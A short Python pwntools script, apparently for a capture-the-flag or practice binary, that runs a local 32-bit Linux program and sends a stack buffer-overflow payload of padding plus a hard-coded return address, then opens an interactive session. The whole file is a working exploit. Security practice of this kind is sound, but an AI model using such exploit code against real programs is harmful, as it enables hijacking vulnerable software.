from pwn import *

context.arch = 'i386'
context.os = 'linux'

file_path = input("file path")

io = process(file_path)

c = int(input("offset:"))

payload = b'a'*c + p32(0x080491f6)
print(payload)

io.recvline()
io.sendline(payload)

io.interactive()
